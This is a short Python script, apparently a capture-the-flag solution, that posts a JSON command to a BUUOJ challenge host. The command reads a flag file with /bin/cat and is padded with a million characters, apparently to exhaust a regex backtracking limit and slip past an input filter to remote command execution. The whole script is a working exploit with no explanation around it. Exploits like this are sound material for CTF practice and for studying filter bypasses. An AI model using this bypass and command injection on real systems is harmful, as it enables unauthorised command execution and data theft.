import requests

payload = '{"cmd":"/bin/cat /home/rceservice/flag","test":"' + "a"*(1000000) + '"}'
res = requests.post("http://49e2dfa3-cb14-49a5-9258-a7c9dce2f653.node4.buuoj.cn:81/", data={"cmd":payload})
#print(payload)
print(res.text)